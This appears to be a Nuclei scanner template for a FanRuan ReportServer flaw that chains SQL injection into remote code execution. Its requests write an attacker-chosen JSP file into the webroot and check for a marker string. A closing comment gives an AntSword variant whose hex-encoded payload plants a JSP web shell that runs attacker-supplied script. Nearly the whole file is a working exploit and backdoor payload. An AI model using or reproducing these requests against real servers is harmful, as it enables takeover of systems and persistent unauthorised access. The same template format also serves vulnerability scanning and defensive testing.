id: fanruan-ReportServer-sqli-rce
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 最新帆软前台getshell漏洞及优化poc分享
  reference:
    - https://mp.weixin.qq.com/s/AliftiLevjz5HB9uL0DOqQ
    - https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/#%E5%9D%91%E7%82%B9%E4%BA%8C-%E9%AB%98%E7%89%88%E6%9C%AC%E5%AF%B9DDL-DML%E8%AF%AD%E5%8F%A5%E5%AD%98%E5%9C%A8%E6%89%A7%E8%A1%8C%E9%99%90%E5%88%B6
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
http:
  - method: GET
    path:
      - "{{BaseURL}}/webroot/decision/view/ReportServer?test=s&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2F{{filename}}.jsp%27%20as%20{{filename}}%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20{{filename}}.exp2%28data%20text%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20{{filename}}.exp2%28data%29%20VALUES%20%28x%2777686f69736365736869%27%29%3B'),1,1)}"
      - "{{BaseURL}}/decision/view/ReportServer?test=s&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2F{{filename}}.jsp%27%20as%20{{filename}}%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20{{filename}}.exp2%28data%20text%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20{{filename}}.exp2%28data%29%20VALUES%20%28x%2777686f69736365736869%27%29%3B'),1,1)}"
      - "{{BaseURL}}/webroot/{{filename}}.jsp"
      - "{{BaseURL}}/{{filename}}.jsp"
    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'
#蚁剑：/webroot/decision/view/ReportServer?test=s&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Faaa.jsp%27%20as%20gggggg%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20gggggg.exp2%28data%20text%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20gggggg.exp2%28data%29%20VALUES%20%28x%27247b27272e676574436c61737328292e666f724e616d6528706172616d2e61292e6e6577496e7374616e636528292e676574456e67696e6542794e616d6528276a7327292e6576616c28706172616d2e62297d%27%29%3B'),1,1)}
